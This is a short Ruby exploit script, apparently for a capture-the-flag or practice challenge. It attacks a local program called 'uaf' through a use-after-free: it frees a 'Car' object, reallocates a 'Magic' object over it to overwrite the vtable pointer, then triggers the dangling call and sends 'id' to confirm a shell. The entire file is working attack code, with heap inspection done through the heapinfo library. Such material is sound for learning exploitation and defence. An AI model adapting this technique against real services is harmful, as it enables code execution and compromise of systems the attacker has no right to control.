#!/usr/bin/env ruby
#encoding: ascii-8bit
#TODO: bug that crash occasionally
require 'heapinfo'
require 'socket'
$HOST, $PORT = '', 12345
$local=false
($HOST = '0'; $local=true) if ARGV.empty?
z=TCPSocket.new $HOST, $PORT
#============================exploit start!================================

z.puts 1 # new Benz
h = heapinfo('./uaf')
puts "sizeof(Car) = %#x" % h.dump(:heap, 0x10).to_chunk.real_size # get size of a car
vtable1 = h.dump(:heap, 0x10, 8).unpack("Q*")[0]
puts "vtable of Benz = %#x" % vtable1

z.puts 4; z.puts 0 # delete Benz
puts h.layouts :fastbin # show fastbin

z.puts 2 # new Magic

# check if exploit will work
vtable2 = h.dump(:heap, 0x10, 8).unpack("Q*")[0]
fail('UAF exploit fail QQ?') if vtable2 == 0 or vtable1 === vtable2

# use after free
z.puts 3

# pwned
sleep 0.1
z.puts 'id'
puts z.gets

